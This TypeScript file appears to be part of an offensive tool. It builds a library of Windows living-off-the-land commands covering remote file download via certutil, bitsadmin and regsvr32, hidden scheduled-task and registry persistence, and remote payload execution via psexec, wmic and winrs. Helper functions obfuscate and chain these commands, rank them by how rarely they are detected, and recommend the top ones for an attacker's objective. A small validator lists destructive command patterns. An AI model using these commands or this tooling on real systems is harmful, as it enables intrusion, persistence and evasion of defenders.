/* ------------------------------------------------------------------ */
/*  Living-off-the-Land (LotL) Command Library                            */
/* ------------------------------------------------------------------ */

export interface LotLCommand {
  id: string
  name: string
  category: string
  description: string
  command: string
  obfuscated: boolean
  riskLevel: "low" | "medium" | "high"
  detectionRate: number
  references: string[]
}

export interface LotLCategory {
  id: string
  name: string
  description: string
  commands: LotLCommand[]
}

/**
 * Comprehensive LotL command library based on LOLBAS project
 */
export const LOTL_COMMANDS: LotLCategory[] = [
  {
    id: "file_operations",
    name: "File Operations",
    description: "Commands for file download, transfer, and manipulation",
    commands: [
      {
        id: "certutil_download",
        name: "Certutil Download",
        category: "file_operations",
        description: "Download remote file using Windows Certutil",
        command: "certutil -urlcache -split -f http://example.com/file.exe C:\\temp\\file.exe",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"],
      },
      {
        id: "certutil_encode",
        name: "Certutil Encode",
        category: "file_operations",
        description: "Base64 encode/decode files",
        command: "certutil -encode input.txt output.txt",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"],
      },
      {
        id: "bitsadmin_download",
        name: "Bitsadmin Download",
        category: "file_operations",
        description: "Download file using Background Intelligent Transfer Service",
        command: "bitsadmin /transfer /download /priority normal http://example.com/file.exe C:\\temp\\file.exe",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"],
      },
      {
        id: "bitsadmin_bypass",
        name: "Bitsadmin Proxy Bypass",
        category: "file_operations",
        description: "Bypass system proxy using Bitsadmin",
        command: "bitsadmin /setcustomproxy 1 null && bitsadmin /transfer /download http://example.com/file.exe C:\\temp\\file.exe",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"],
      },
      {
        id: "regsvr32_download",
        name: "Regsvr32 Download",
        category: "file_operations",
        description: "Download file using Regsvr32 with COM object",
        command: "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,InternetExplorerA",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"],
      },
    ],
  },
  {
    id: "system_info",
    name: "System Information",
    description: "Commands for gathering system information",
    commands: [
      {
        id: "wmic_computersystem",
        name: "WMIC Computer System",
        category: "system_info",
        description: "Get detailed computer system information",
        command: "wmic computersystem get Name, Domain, Manufacturer, Model, NumberOfProcessors, TotalPhysicalMemory",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.35,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_process",
        name: "WMIC Process List",
        category: "system_info",
        description: "List all running processes",
        command: "wmic process get Name, ProcessId, ParentProcessId, CommandLine",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_service",
        name: "WMIC Service List",
        category: "system_info",
        description: "List all Windows services",
        command: "wmic service get Name, DisplayName, State, StartMode",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_share",
        name: "WMIC Share List",
        category: "system_info",
        description: "List network shares",
        command: "wmic share get Name, Path, Type",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.40,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "systeminfo",
        name: "SystemInfo",
        category: "system_info",
        description: "Get comprehensive system information",
        command: "systeminfo",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.25,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Systeminfo/"],
      },
    ],
  },
  {
    id: "network_operations",
    name: "Network Operations",
    description: "Commands for network reconnaissance and communication",
    commands: [
      {
        id: "powershell_dns",
        name: "PowerShell DNS Query",
        category: "network_operations",
        description: "Query DNS records using PowerShell",
        command: "Resolve-DnsName -Name example.com -Type A",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "netstat_connections",
        name: "Netstat Connections",
        category: "network_operations",
        description: "List network connections",
        command: "netstat -ano",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Netstat/"],
      },
      {
        id: "net_share",
        name: "Net Share",
        category: "network_operations",
        description: "List network shares",
        command: "net share",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.40,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
      {
        id: "net_user",
        name: "Net User",
        category: "network_operations",
        description: "List local users",
        command: "net user",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
    ],
  },
  {
    id: "persistence",
    name: "Persistence",
    description: "Commands for maintaining access",
    commands: [
      {
        id: "schtasks_create",
        name: "Schtasks Create",
        category: "persistence",
        description: "Create scheduled task for persistence",
        command: "schtasks /create /tn \"UpdateTask\" /tr \"C:\\temp\\update.exe\" /sc onstart /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Schtasks/"],
      },
      {
        id: "schtasks_hidden",
        name: "Schtasks Hidden",
        category: "persistence",
        description: "Create hidden scheduled task",
        command: "schtasks /create /tn \"UpdateTask\" /tr \"C:\\temp\\update.exe\" /sc onstart /rl HIDDEN /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Schtasks/"],
      },
      {
        id: "wmi_persistence",
        name: "WMI Event Consumer",
        category: "persistence",
        description: "Create WMI event consumer for persistence",
        command: "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"Filter\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.85,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "registry_run",
        name: "Registry Run Key",
        category: "persistence",
        description: "Add program to Run registry key",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Update\" /t REG_SZ /d \"C:\\temp\\update.exe\" /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Reg/"],
      },
    ],
  },
  {
    id: "lateral_movement",
    name: "Lateral Movement",
    description: "Commands for moving through a network",
    commands: [
      {
        id: "psexec_remote",
        name: "PsExec Remote",
        category: "lateral_movement",
        description: "Execute command on remote system using PsExec",
        command: "psexec \\\\target-computer -s -c C:\\temp\\payload.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OtherMSBinaries/PsExec/"],
      },
      {
        id: "wmi_remote",
        name: "WMI Remote Command",
        category: "lateral_movement",
        description: "Execute command remotely using WMI",
        command: "wmic /node:target-computer process call create \"C:\\temp\\payload.exe\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "winrm_remote",
        name: "WinRM Remote Command",
        category: "lateral_movement",
        description: "Execute command remotely using WinRM",
        command: "winrs -r:target-computer -u:administrator -p:password cmd /c C:\\temp\\payload.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Winrs/"],
      },
    ],
  },
]

/**
 * Get command by ID
 */
export function getCommandById(id: string): LotLCommand | undefined {
  for (const category of LOTL_COMMANDS) {
    const command = category.commands.find(cmd => cmd.id === id)
    if (command) return command
  }
  return undefined
}

/**
 * Get commands by category
 */
export function getCommandsByCategory(categoryId: string): LotLCommand[] {
  const category = LOTL_COMMANDS.find(cat => cat.id === categoryId)
  return category?.commands || []
}

/**
 * Get commands by risk level
 */
export function getCommandsByRiskLevel(riskLevel: "low" | "medium" | "high"): LotLCommand[] {
  const commands: LotLCommand[] = []
  for (const category of LOTL_COMMANDS) {
    commands.push(...category.commands.filter(cmd => cmd.riskLevel === riskLevel))
  }
  return commands
}

/**
 * Search commands by keyword
 */
export function searchCommands(keyword: string): LotLCommand[] {
  const lowerKeyword = keyword.toLowerCase()
  const commands: LotLCommand[] = []
  
  for (const category of LOTL_COMMANDS) {
    for (const command of category.commands) {
      if (
        command.name.toLowerCase().includes(lowerKeyword) ||
        command.description.toLowerCase().includes(lowerKeyword) ||
        command.command.toLowerCase().includes(lowerKeyword)
      ) {
        commands.push(command)
      }
    }
  }
  
  return commands
}

/**
 * Obfuscate command
 */
export function obfuscateCommand(command: string): string {
  // Apply basic obfuscation techniques
  let obfuscated = command
  
  // Variable substitution
  obfuscated = obfuscated.replace(/powershell/gi, "PowerShell")
  obfuscated = obfuscated.replace(/cmd/gi, "CmD")
  obfuscated = obfuscated.replace(/net/gi, "NeT")
  
  // String splitting
  obfuscated = obfuscated.replace(/C:\\/g, "C:\\\\")
  
  // Case randomization
  obfuscated = obfuscated.split('').map((char, index) => {
    if (index % 2 === 0) {
      return char.toLowerCase()
    }
    return char.toUpperCase()
  }).join('')
  
  return obfuscated
}

/**
 * Generate command chain for multi-step operations
 */
export function generateCommandChain(commands: LotLCommand[]): string {
  return commands.map(cmd => {
    if (cmd.obfuscated) {
      return obfuscateCommand(cmd.command)
    }
    return cmd.command
  }).join(' && ')
}

/**
 * Validate command safety
 */
export function validateCommandSafety(command: string): {
  safe: boolean
  issues: string[]
} {
  const issues: string[] = []
  
  // Check for destructive operations
  const destructivePatterns = [
    { pattern: /rm -rf/i, message: "File deletion detected" },
    { pattern: /format.*c:/i, message: "Disk formatting detected" },
    { pattern: /shutdown/i, message: "System shutdown detected" },
    { pattern: /restart/i, message: "System restart detected" },
    { pattern: /del \/f/i, message: "Force file deletion detected" },
  ]
  
  destructivePatterns.forEach(({ pattern, message }) => {
    if (pattern.test(command)) {
      issues.push(message)
    }
  })
  
  return {
    safe: issues.length === 0,
    issues,
  }
}

/**
 * Get command effectiveness score
 */
export function getCommandEffectivenessScore(command: LotLCommand): {
  score: number
  factors: {
    detectionRate: number
    obfuscation: number
    riskLevel: number
  }
} {
  const detectionScore = 100 - command.detectionRate * 100
  const obfuscationScore = command.obfuscated ? 20 : 0
  const riskScore = command.riskLevel === "low" ? 20 : command.riskLevel === "medium" ? 40 : 60
  
  const score = (detectionScore + obfuscationScore + riskScore) / 3
  
  return {
    score,
    factors: {
      detectionRate: command.detectionRate,
      obfuscation: command.obfuscated ? 1 : 0,
      riskLevel: riskScore / 20,
    },
  }
}

/**
 * Recommend commands for specific objectives
 */
export function recommendCommands(objective: string): LotLCommand[] {
  const lowerObjective = objective.toLowerCase()
  const recommendations: LotLCommand[] = []
  
  if (lowerObjective.includes("download") || lowerObjective.includes("file")) {
    recommendations.push(...getCommandsByCategory("file_operations"))
  }
  
  if (lowerObjective.includes("info") || lowerObjective.includes("system") || lowerObjective.includes("recon")) {
    recommendations.push(...getCommandsByCategory("system_info"))
  }
  
  if (lowerObjective.includes("network") || lowerObjective.includes("connection")) {
    recommendations.push(...getCommandsByCategory("network_operations"))
  }
  
  if (lowerObjective.includes("persist") || lowerObjective.includes("maintain")) {
    recommendations.push(...getCommandsByCategory("persistence"))
  }
  
  if (lowerObjective.includes("lateral") || lowerObjective.includes("move") || lowerObjective.includes("remote")) {
    recommendations.push(...getCommandsByCategory("lateral_movement"))
  }
  
  // Return top recommendations by effectiveness score
  return recommendations
    .map(cmd => ({ command: cmd, score: getCommandEffectivenessScore(cmd) }))
    .sort((a, b) => b.score.score - a.score.score)
    .slice(0, 5)
    .map(item => item.command)
}